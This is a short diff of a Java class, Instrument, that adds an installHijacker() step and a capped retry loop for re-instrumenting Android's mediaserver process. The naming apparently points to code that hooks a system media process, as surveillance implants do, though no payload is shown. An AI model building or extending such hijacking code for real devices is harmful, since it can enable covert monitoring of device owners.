@@ -108,6 +108,10 @@ public class Instrument {
 			return false;
 		}
 
+		if (!installHijacker()) {
+			return false;
+		}
+		
 		try {
 			int pid = getProcessPid();
 
@@ -181,7 +185,7 @@ public class Instrument {
 						monitor = new Thread(pidMonitor);
 						monitor.start();
 					} else {
-						pidMonitor.setPid(pid);
+						pidMonitor.setPid(newpid);
 					}
 				}
 			} else {
@@ -251,6 +255,7 @@ public class Instrument {
 
 	class MediaserverMonitor implements Runnable {
 		private int cur_pid, start_pid;
+		private int failedCounter = 0;
 
 		public void setPid(int pid) {
 			start_pid = pid;
@@ -286,8 +291,16 @@ public class Instrument {
 						Check.log(TAG + "(MediaserverMonitor run): Mediaserver died, restarting instrumentation");
 					}
 
-					startInstrumentation();
-					// start_pid = getProcessPid();
+					failedCounter  += 1;
+					if(failedCounter < 3) {
+						startInstrumentation();
+					}else{
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (run) too many retry, sto restart mediaserver");
+						}
+					}
+				}else{
+					failedCounter = 0;
 				}
 			}
 		}
